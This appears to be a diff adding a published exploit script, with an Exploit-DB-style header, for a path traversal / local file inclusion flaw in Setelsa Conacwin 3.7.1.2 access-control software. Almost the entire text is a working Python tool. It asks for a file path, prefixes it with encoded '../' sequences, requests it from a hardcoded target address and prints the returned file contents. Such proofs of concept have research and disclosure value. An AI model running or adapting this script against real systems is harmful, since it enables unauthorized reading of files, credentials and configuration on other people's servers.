@@ -1,0 +1,29 @@
+# Exploit Title: Setelsa Conacwin 3.7.1.2 - Local File Inclusion
+# Date: 02/09/20
+# Exploit Author: Bryan Rodriguez Martin AKA tr3mb0
+# Vendor Homepage: http://setelsa-security.es/productos/control-de-acceso/
+# Version: 3.7.1.2
+# Tested on: Windows
+# FIX: The recommendation from the vendor is to update to the last version.
+
+import requests
+import urllib.parse
+import colorama
+
+from colorama import Fore, Style
+
+ENDPOINT = "http://10.4.8.11:8081/"
+
+while True:
+    cmd = input(Fore.RED + "[*] FILE >> ")
+    print(Style.RESET_ALL)
+
+    #cmd = urllib.parse.quote(cmd)
+    ENDPOINT2 = ENDPOINT + "..%2F..%2F"  + cmd
+
+    print("[*] Target >> " + ENDPOINT2)
+    print(" ")
+    r = requests.get(url = ENDPOINT2)
+
+    extract = r.text
+    print(extract)
